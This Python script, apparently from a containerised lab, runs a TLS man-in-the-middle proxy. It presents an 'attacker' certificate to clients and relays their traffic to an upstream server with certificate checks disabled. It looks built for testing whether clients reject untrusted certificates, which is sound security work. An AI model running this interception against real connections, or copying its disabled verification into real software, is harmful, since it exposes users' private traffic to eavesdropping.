#!/usr/bin/env python3
import socket, ssl, threading, sys

if len(sys.argv) != 4:
    print("Usage: mitm_proxy.py <attacker_cert.pem> <attacker_key.pem> <upstream_host> <upstream_port?>")
# We'll support two forms: either (cert,key,upstream_host,upstream_port) or (cert,key,upstream_host)
# For compose we pass: cert key upstream_host upstream_port
# To simplify, we read from environment or fallback
try:
    att_cert = sys.argv[1]
    att_key = sys.argv[2]
    upstream_host = sys.argv[3]
    upstream_port = int(sys.argv[4]) if len(sys.argv) > 4 else 8443
except Exception:
    att_cert = "/certs/attacker/attacker.pem"
    att_key = "/certs/attacker/attacker-key.pem"
    upstream_host = "tls_server"
    upstream_port = 8443

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9443

def pipe(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            print(f"[MITM] {len(data)} bytes")
            dst.sendall(data)
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass

def handle_client(connstream):
    # Connect to the real server (attacker proxies but does not verify server cert)
    context_up = ssl.create_default_context()
    context_up.check_hostname = False
    context_up.verify_mode = ssl.CERT_NONE

    upstream_sock = socket.create_connection((upstream_host, upstream_port))
    upstream_ssock = context_up.wrap_socket(upstream_sock, server_hostname=upstream_host)

    t1 = threading.Thread(target=pipe, args=(connstream, upstream_ssock))
    t2 = threading.Thread(target=pipe, args=(upstream_ssock, connstream))
    t1.start(); t2.start()
    t1.join(); t2.join()
    connstream.close()
    upstream_ssock.close()

def main():
    bindsock = socket.socket()
    bindsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsock.bind((LISTEN_HOST, LISTEN_PORT))
    bindsock.listen(5)

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=att_cert, keyfile=att_key)

    print(f"MITM proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {upstream_host}:{upstream_port}")
    while True:
        newsock, addr = bindsock.accept()
        try:
            connstream = context.wrap_socket(newsock, server_side=True)
            threading.Thread(target=handle_client, args=(connstream,)).start()
        except Exception as e:
            print("wrap failed", e)
            newsock.close()

if __name__ == "__main__":
    main()
